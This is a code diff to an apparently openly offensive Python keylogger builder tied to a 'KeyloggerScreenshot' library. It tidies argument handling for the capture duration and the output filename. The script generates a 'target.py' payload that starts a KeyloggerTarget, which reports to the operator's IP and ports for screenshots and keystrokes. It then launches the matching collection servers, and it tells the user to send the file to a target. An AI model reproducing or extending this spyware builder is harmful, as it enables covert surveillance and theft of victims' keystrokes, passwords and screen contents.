@@ -36,9 +36,14 @@ try:
             if "-s" in lst:
                 idx_s = lst.index("-s")
                 try:
+                    if "-" in lst[idx_s+1]:
+                        print("PLEASE SPECIFY YOUR SECONDS -s")
+                        quit()
+
                     seconds = int(lst[idx_s + 1])
                     if seconds < 60:
                         print(f"SECONDS MUST BE GREATER THAN 60")
+                        quit()
 
                 except IndexError:
                     seconds = 60
@@ -47,16 +52,21 @@ try:
             if "-cf" in lst:
                 idx_cf = lst.index("-cf")
                 try:
-                    neu_idx_cf = lst[idx_cf + 1]
-                    with open(f"{neu_idx_cf}", "a+") as file:
+                    filename = lst[idx_cf + 1]
+                    if not filename.endswith(".py"):
+                        data = filename.split(".")
+                        filename = f"{data[0]}.py"
+                    if "-" in filename:
+                        filename = f"target.py"
+
+                    with open(f"{filename}", "a+") as file:
                         file.write(f"import KeyloggerScreenshot as ks \n\nip = '{ipaddress}'\nkey_client = ks.KeyloggerTarget(ip, {port_photos}, ip, {port_keylogger}, ip, {port_listener},ip, {port_time}, duration_in_seconds={seconds}) \nkey_client.start()")
-                    print(f"{neu_idx_cf.upper()} has been created")
+                    print(f"{filename.upper()} has been created")
 
                 except IndexError:
                     with open("target.py", "a+") as file:
                         file.write(f"import KeyloggerScreenshot as ks \n\nip = '{ipaddress}'\nkey_client = ks.KeyloggerTarget(ip, {port_photos}, ip, {port_keylogger}, ip, {port_listener},ip, {port_time}, duration_in_seconds={seconds}) \nkey_client.start()")
                     print("TARGET.PY HAS BEEN CREATED YOU CAN SEND THIS TO YOUR TARGET")
-            else: seconds = 60
             server_photos = ks.ServerPhotos(ipaddress, port_photos)
 
             server_keylogger = ks.ServerKeylogger(ipaddress, port_keylogger)
